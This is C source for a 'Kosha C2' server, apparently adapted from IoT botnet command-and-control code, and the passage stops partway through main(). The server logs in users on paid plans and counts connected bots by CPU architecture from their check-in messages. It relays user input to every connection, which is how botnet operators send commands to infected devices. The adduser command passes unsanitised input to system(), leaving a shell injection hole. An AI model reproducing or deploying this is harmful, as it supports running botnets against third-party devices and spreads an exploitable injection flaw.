/*
IPLookup Script And Snippet taken from "Cayosin", credits to the original developer of both the script and snippet of code.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>

#define MAXFDS 1000000
//////////////////////////
#define Project "Kosha C2 Chatroom"
#define Developer ["FlexingOnLamers", "GeorgiaCri"]
#define Homies ["Resentual", "KGFL", "Swizz", "Soap"]
#define tools ["adduser", "domainresolver", "portscanner", "IPGeoLocation"]

struct account 
{
  char user[200]; // username
  char password[200]; // password
  char id [200]; // admin / basic user 
  char plan [200]; // plan types below!
};
char *plans[] = {
    "test",
    "Beginner",
    "Silver",
    "Gold",
    "Admin",
    "Owner"
};
static struct account accounts[50];

struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;
} managements[MAXFDS];

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
  int total = 0, got = 1;
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
  return got;
}
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl");
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl");
    return -1;
  }
  return 0;
}


static int create_and_bind(char *port)
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n");
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {                     
                       send(i, "\x1b[37m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                //  printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[37m~> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0; 
        clients[events[i].data.fd].x86 = 0;
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
        int dup = 0;
        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
          if(!clients[ipIndex].connected || ipIndex == infd) continue;
          if(clients[ipIndex].ip == clients[infd].ip) {
            dup = 1;
            break;
          }}
          s = make_socket_non_blocking(infd);
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "!* KOSHA ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int thefd = events[i].data.fd;
        struct clientdata_t *client = &(clients[thefd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0; 
        client->mips = 0;
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
              continue;
            } 
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mx86_64\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mx86_32\e[1;37m] Loaded!") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mMIPS\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mMPSL\e[1;37m] Loaded!")  == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM4\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM5\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM6\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mARM7\e[1;37m] Loaded!")  == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mPPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->ppc = 1;
                        }
                        if(strstr(buf, "\e[1;37m[\e[0;31mKosha\e[1;37m] Device:[\e[0;31mSPC\e[1;37m] Loaded!")  == buf)
                        {
                          client->spc = 1;
                        }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0; 
                                        client->sh4 = 0;
                                        client->x86 = 0;
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected() 
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}

    void *titleWriter(void *sock) 
    {
        int thefd = (long int)sock;
        char string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Kosha Chatroom! || Users Online: %d %c", '\033', managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
            sleep(2);
        }
    }


int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("chat.txt", "r")) == NULL) {
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
void client_addr(struct sockaddr_in addr) {
  printf("\x1b[1;37m[\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("Kosha_IP.log", "a");
  fprintf(logFile, "\n\x1b[1;37mIP:[\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}

void *telnetWorker(void *sock) {
  int thefd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char counter[2048];
  memset(counter, 0, 2048);
  char buf[2048];
  char* nickstring;
  char usernamez[80];
  char* password;
  char *admin = "admin"; 
  char *normal = "normal";
  memset(buf, 0, sizeof buf);
  char botnet[2048];
  memset(botnet, 0, 2048);

  FILE *fp;
  int i = 0;
  int c;
  fp = fopen("chat.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s %s", accounts[j].user, accounts[j].password, accounts[j].id, accounts[j].plan); 
    ++j;
  }

  char Prompt_1 [500];
  char Prompt_2 [500];
  char Prompt_3 [500];
  char Prompt_4 [500];
  char Prompt_5 [500];
  char Prompt_6 [500];
  char Prompt_7 [500];
  char Prompt_8 [500];
  char Prompt_9 [500];

  sprintf(Prompt_1,  "\x1b[1;37mWelcome To The \x1b[0;31mKosha \x1b[1;37mChatroom!\r\n");
  sprintf(Prompt_2,  "\x1b[1;37mAll \x1b[0;31mConnections\x1b[1;37m Are Logged, Please Do Not Share \x1b[0;31mLogins\x1b[1;37m!\r\n");
  sprintf(Prompt_3,  "\x1b[1;37mNo \x1b[0;31mSpamming\x1b[1;37m The \x1b[0;31mServer!\r\n");
  sprintf(Prompt_4,  "\x1b[1;37mFollow\x1b[0;31m Administrators\x1b[1;37m rules\r\n");
  sprintf(Prompt_5,  "\x1b[1;37mPlease Login Below\r\n");
        
  if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_1, strlen(Prompt_1), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_2, strlen(Prompt_2), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_3, strlen(Prompt_3), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_4, strlen(Prompt_4), MSG_NOSIGNAL) == -1) goto end;
  if(send(thefd, Prompt_5, strlen(Prompt_5), MSG_NOSIGNAL) == -1) goto end;

  sprintf(botnet, "\x1b[0;31mUsername\x1b[1;37m:");
  if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
  trim(buf);
  sprintf(usernamez, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

    if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
    if (strcmp(nickstring, accounts[find_line].user) == 0) {
    sprintf(botnet, "\x1b[1;37mUsername Accepted!\r\n", accounts[find_line].user, buf);
    sprintf(botnet, "\x1b[1;37mPlease Enter Your \x1b[0;31mPassword\x1b[1;37m!\r\n");
    sprintf(botnet, "\x1b[0;31mPassword\x1b[1;37m:");
    if (send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
    goto Kosha;
  }
    failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000];
        char failed_line2[5000];

        char clearscreen [5000];
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");

        sprintf(failed_line1, "\x1b[1;37mLogin \x1b[0;31mError\x1b[1;37m!\r\n");  // We are Attempting To Display FailedBanner!
        sprintf(failed_line2, "\x1b[1;37mIf you run into this issue please contact the \x1b[0;31mowner\x1b[1;37m!\r\n");  // We are Attempting To Display FailedBanner!


        sleep(1); // You Have Failed!
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        sleep(3);
        goto end; // You Have Failed!
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        Kosha: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char Kosha_1 [90000];
        char Kosha_2 [90000];
        char Kosha_3 [90000];
        char Kosha_4 [90000];

        sprintf(Kosha_1, "\x1b[0;31m          ╦╔═╔═╗╔═╗╦ ╦╔═╗  ╔═╗╦═╗╔═╗ ╦╔═╗╔═╗╔╦╗\r\n");
        sprintf(Kosha_2, "\x1b[0;31m          ╠╩╗║ ║╚═╗╠═╣╠═╣  ╠═╝╠╦╝║ ║ ║║╣ ║   ║ \r\n");
        sprintf(Kosha_3, "\x1b[0;31m          ╩ ╩╚═╝╚═╝╩ ╩╩ ╩  ╩  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩\r\n");
        sprintf(Kosha_4, "\x1b[1;37m    \x1b[1;37mUser: \x1b[0;31m%s \x1b[1;37m|| Access Level:\x1b[0;31m %s\x1b[1;37m  || Plan:\x1b[0;31m %s\r\n", accounts[find_line].user, accounts[find_line].id, accounts[find_line].plan, buf);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_1, strlen(Kosha_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_2, strlen(Kosha_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_3, strlen(Kosha_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_4, strlen(Kosha_4), MSG_NOSIGNAL) == -1) goto end; 

        while(1) 
        { // We are Displaying Attempting to display main banner!
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf); // We are Displaying Attempting to display main banner!
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        break; // World Break!
        } // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        managements[thefd].connected = 1; // We are Displaying Attempting to display main banner!

      while(fdgets(buf, sizeof buf, thefd) > 0)
      {
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
    {
      if(strcmp(admin, accounts[find_line].id) == 0)
      {
        char *token = strtok(buf, " ");
        char *userinfo = token+sizeof(token);
        trim(userinfo);
        char *uinfo[50];
        sprintf(uinfo, "echo '%s' >> chat.txt", userinfo);
        system(uinfo);
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, userinfo);
        sprintf(botnet, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] \x1b[1;37mUser:[\x1b[0;36m%s\x1b[1;37m] Added User:[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, userinfo);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
      }
      else
      {
        sprintf(botnet, "\x1b[0;31mAdmins Only!\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
      }
        }
        if(strstr(buf, "HELP") || strstr(buf, "help") || strstr(buf, "Help") || strstr(buf, "?"))  
        {
        char help_cmd1  [5000];
        char help_line1  [5000];
        char cmd_clear [5000];
        char cmd_logout [5000];
        char cmd_staff [5000];
        char cmd_personal [5000];
        char help_line3  [5000];

        sprintf(help_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]All Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(help_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(cmd_clear,  "\x1b[0;37m[\x1b[0;31mClear Screen\x1b[1;37m]           CLEAR\r\n");
        sprintf(cmd_logout,  "\x1b[1;37m[\x1b[0;31mLOGOUT\x1b[1;37m]                 LOGOUT\r\n");
        sprintf(cmd_staff,  "\x1b[1;37m[\x1b[0;31mStaff Commands\x1b[1;37m]         STAFF\r\n");
        sprintf(cmd_personal,  "\x1b[1;37m[\x1b[0;31mPersonal Information\x1b[1;37m]  INFORMATION\r\n");
        sprintf(help_line3,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");

        if(send(thefd, help_cmd1, strlen(help_cmd1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line1, strlen(help_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_clear, strlen(cmd_clear),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_logout, strlen(cmd_logout),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_staff, strlen(cmd_staff),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, cmd_personal, strlen(cmd_personal),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, help_line3, strlen(help_line3),   MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, "clear") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "CLS"))  
        {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Kosha_1, strlen(Kosha_1), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_2, strlen(Kosha_2), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_3, strlen(Kosha_3), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, Kosha_4, strlen(Kosha_4), MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
         if(strstr(buf, "info") || strstr(buf, "INFO") || strstr(buf, "INFORMATION") || strstr(buf, "information"))  
        {
        char user_user [500];
        char user_pass [500];
        char user_ip [500];
        char user_plan [500];
        char user_level [500];
        char user_time [500];

        sprintf(user_user,       "\x1b[1;37mUsername:\x1b[0;31m %s\r\n", accounts[find_line].user, buf);
        sprintf(user_pass,       "\x1b[1;37mPassword:\x1b[0;31m %s\r\n", accounts[find_line].password, buf);
        sprintf(user_ip,    "\x1b[1;37mUser IP: \x1b[0;31mCOMING SOON\r\n");
        sprintf(user_plan,  "\x1b[1;37mUser Plan:\x1b[0;31m %s\r\n", accounts[find_line].plan, buf);
        sprintf(user_level, "\x1b[1;37mUser Level:\x1b[0;31m %s\r\n", accounts[find_line].id, buf);
        sprintf(user_time,  "\x1b[1;37mTime Left: \x1b[0;31mCOMING SOON\r\n");
        if(send(thefd, user_user, strlen(user_user), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_pass, strlen(user_pass), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_ip, strlen(user_ip), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_plan, strlen(user_plan), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_level, strlen(user_level), MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, user_time, strlen(user_time), MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        {
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break; // World Break!
        }
        continue;
        }
        if(strstr(buf, "SPECIAL") || strstr(buf, "STAFF") || strstr(buf, "Staff") || strstr(buf, "staff"))
        {
        pthread_create(&title, NULL, &titleWriter, sock);
        char special_cmd1  [5000];
        char special_line1  [5000];
        char special_1  [5000];
        char special_line2  [5000];

        sprintf(special_cmd1,   "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]Admin Commands\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]     \r\n");
        sprintf(special_line1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n");
        sprintf(special_1,      "\x1b[1;37m[\x1b[0;31mAdds User\x1b[1;37m]         adduser   [\x1b[0;31mUSER\x1b[1;37m] [\x1b[0;31mPASS\x1b[1;37m]\r\n");
        sprintf(special_line2,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]---------------------------------------------------------\r\n"); 

        if(send(thefd, special_cmd1, strlen(special_cmd1),   MSG_NOSIGNAL) == -1) goto end; 
        if(send(thefd, special_line1, strlen(special_line1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_1, strlen(special_1),   MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, special_line2,  strlen(special_line2),   MSG_NOSIGNAL) == -1) goto end; 
        pthread_create(&title, NULL, &titleWriter, sock);
        while(1) 
        { 
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        } 
        if(strstr(buf, "LOGOUT"))
        {
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("Kosha_Logout.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT") || strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(botnet, "\x1b[0;31m[\x1b[1;37m%s\x1b[0;31m@\x1b[1;37mKosha\x1b[0;31m]\x1b[1;37m:", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("Kosha_C2.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] User:[\x1b[0;36m%s\x1b[1;37m] - Command:\x1b[1;37m[\x1b[0;36m%s\x1b[1;37m]\n", accounts[find_line].user, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        } // Let Us Continue Our Journey!
        end:    // cleanup dead socket
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Incoming User Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("Kosha_Connection.log", "a");
        fprintf(logFile, "\x1b[1;37m[\x1b[0;31mKosha\x1b[1;37m] Incoming User Connection From [\x1b[0;36m%d.%d.%d.%d\x1b[1;37m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
